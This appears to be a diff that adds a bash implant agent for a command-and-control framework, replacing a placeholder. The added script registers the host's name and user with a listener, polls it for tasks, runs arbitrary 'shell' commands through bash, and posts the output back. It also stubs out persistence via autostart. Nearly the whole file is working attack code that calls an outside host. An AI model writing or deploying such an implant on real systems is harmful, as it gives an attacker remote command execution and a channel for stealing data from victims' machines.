@@ -1,1 +1,42 @@
-TODO: agent code
+IP={{LISTENER_IP}}
+PORT={{LISTENER_PORT}}
+sleeptime=3
+name=""
+
+hname=$(hostname)
+uname=$(whoami)
+regurl="http://$IP:$PORT/reg"
+name=$(curl -X POST --data "hname=$hname&uname=$uname" -H "Content-Type: application/x-www-form-urlencoded" $regurl)
+
+resulturl="http://$IP:$PORT/results/$name"
+taskurl="http://$IP:$PORT/tasks/$name"
+
+while true
+do
+    task=$(curl $taskurl)
+    
+    command=$(echo $task | awk -F' ' '{ print $1 }')
+    args=$(echo $task | awk -F' ' '{$1=""; print $0}')
+
+    if [ -n "task" ]; then
+        
+        command=$(echo $task | awk -F' ' '{ print $1 }')
+        args=$(echo $task | awk -F' ' '{$1=""; print $0}')
+
+        if [ "$command" == "shell" ]; then
+            data=$(bash -c "$args")
+            curl -X POST --data "result=$data" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
+        fi
+
+        if [ "$command" == "persist" ]; then
+            echo ""
+            # TODO: save somewhere and add to autostart
+        fi
+        
+        if [ "$command" == "terminate" ]; then
+            exit
+        fi
+    fi  
+
+    sleep $sleeptime
+done
